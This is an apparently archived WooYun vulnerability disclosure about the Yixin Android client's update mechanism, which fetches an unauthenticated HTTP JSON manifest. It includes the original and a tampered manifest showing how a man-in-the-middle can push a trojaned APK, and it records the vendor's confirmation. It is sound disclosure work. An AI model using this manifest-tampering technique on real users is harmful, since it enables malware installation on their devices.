{"id": 82484, "wybug_id": "wooyun-2015-0150915", "wybug_title": "易信安卓客户端升级过程存在缺陷，可被中间人攻击利用植入木马", "wybug_corp": "网易", "wybug_author": "zhchbin", "wybug_date": "2015-11-02 16:32", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "非授权访问/认证绕过", "wybug_level": "中", "wybug_rank_0": "7", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["手机应用", "安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-08：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 参考 http://www.wooyun.org/bugs/wooyun-2015-0125221 学习了一下，发现易信的安卓客户端更新机制也是存在类似问题。官网的FAQ说：易信如上线新版本，在登录易信客户端时会有相应升级提示信息，您只需按照升级提示下载最新版本安装即可。我用旧版本表示没收到升级更新的提示，还要我手动升级，所以这个漏洞问题应该不大，但也是个问题啊。 详细说明：  易信检查升级的时候是通过接口：\nhttp://**.**.**.**/android_update.json\n检查是否有新版本更新，该接口返回内容如下：\n{\"versionCode\":217,\"md5\":\"c2c5fa68420ca56e91e72e38ef140ec8\",\"downloadUrl\":\"http://**.**.**.**/update/installer/yixin.apk\",\"fileName\":\"yixin.apk\",\"title\":\"5qOA5rWL5Yiw5paw54mI5pys\",\"description\":\"MS7jgJDmlrDlop7jgJHnvqTkuLvmlK/mjIHorr7nva7nrqHnkIblkZjjgIHlhaXnvqTpqozor4Hj\\ngIHpgoDor7fmlrDmiJDlkZjnmoTmnYPpmZDphY3nva4KMi7jgJDmlrDlop7jgJHpnZLmnpznmoRH\\nSUbmiqXorablm77niYfmlK/mjIHmt7vliqDliLDoh6rlrprkuYnooajmg4UKMy7jgJDkvJjljJbj\\ngJHpnZLmnpznlKjmiLflj6/ku47igJzlj5HnjrDigJ3kuK3igJzpnZLmnpzmkYTlg4/mnLrigJ3n\\nm7TmjqXov5vlhaUKNC7jgJDkvJjljJbjgJHosIPmlbTkvJjljJbkuobpppbluKfmtojmga/liJfo\\noajkuK3kv6Hmga/mlLblj5HnmoTnvKnnlaXmlofmoYgKNS7jgJDkvJjljJbjgJHosIPmlbTkvJjl\\njJbkuobmmJ/luIHlub/lnLrpppbpobXop4bop4nvvIzkvJjljJbpgJror53ml7bplb/lhZHmjaLm\\ntYHnqIsKNi7jgJDkvJjljJbjgJHkvJjljJboh6rlrprkuYnooajmg4Xmt7vliqDlip/og73kuqTk\\nupLmtYHnqIvlj4rop4bop4kKNy7jgJDkv67lpI3jgJHkv67lpI3oi6XlubJidWc=\",\"notify\":true,\"mini\":0,\"length\":46306404,\"patch\":false,\"patchMd5\":\"\",\"patchDownloadUrl\":\"\",\"patchLength\":0}\n字段说明：versionCode是版本号，md5是新apk文件的MD5值，downloadUrl是新版本apk的下载地址，title和description是更新说明，用base64进行编码，其中description使用\\n换行，length是文件的大小，以byte为单位。只要修改一下versionCode，md5，downloadUrl，length即可触发升级。   漏洞证明：  易信安卓客户端版本：**.**.**.**修改后的数据包：\n{\"versionCode\":218,\"md5\":\"520ee34804658420f6e3e6ec9dc26894\",\"downloadUrl\":\"**.**.**.**/yixin.apk\",\"fileName\":\"yixin.apk\",\"title\":\"5qOA5rWL5Yiw5paw54mI5pys\",\"description\":\"MS7jgJDmlrDlop7jgJHnvqTkuLvmlK/mjIHorr7nva7nrqHnkIblkZjjgIHlhaXnvqTpqozor4Hj\\ngIHpgoDor7fmlrDmiJDlkZjnmoTmnYPpmZDphY3nva4KMi7jgJDmlrDlop7jgJHpnZLmnpznmoRH\\nSUbmiqXorablm77niYfmlK/mjIHmt7vliqDliLDoh6rlrprkuYnooajmg4UKMy7jgJDkvJjljJbj\\ngJHpnZLmnpznlKjmiLflj6/ku47igJzlj5HnjrDigJ3kuK3igJzpnZLmnpzmkYTlg4/mnLrigJ3n\\nm7TmjqXov5vlhaUKNC7jgJDkvJjljJbjgJHosIPmlbTkvJjljJbkuobpppbluKfmtojmga/liJfo\\noajkuK3kv6Hmga/mlLblj5HnmoTnvKnnlaXmlofmoYgKNS7jgJDkvJjljJbjgJHosIPmlbTkvJjl\\njJbkuobmmJ/luIHlub/lnLrpppbpobXop4bop4nvvIzkvJjljJbpgJror53ml7bplb/lhZHmjaLm\\ntYHnqIsKNi7jgJDkvJjljJbjgJHkvJjljJboh6rlrprkuYnooajmg4Xmt7vliqDlip/og73kuqTk\\nupLmtYHnqIvlj4rop4bop4kKNy7jgJDkv67lpI3jgJHkv67lpI3oi6XlubJidWc=\",\"notify\":true,\"mini\":0,\"length\":1325922,\"patch\":false,\"patchMd5\":\"\",\"patchDownloadUrl\":\"\",\"patchLength\":0}\n劫持会话后造成的结果，截图：\n\n\n\n   修复方案：  参考：http://**.**.**.**/bugs/wooyun-2015-0125221   版权声明：转载请注明来源 zhchbin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-11-05 10:35 厂商回复： 已经迅速排查，不会影响用户日常使用，产品将于下个版本更新时修复该问题，感谢白帽子对网易产品的关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}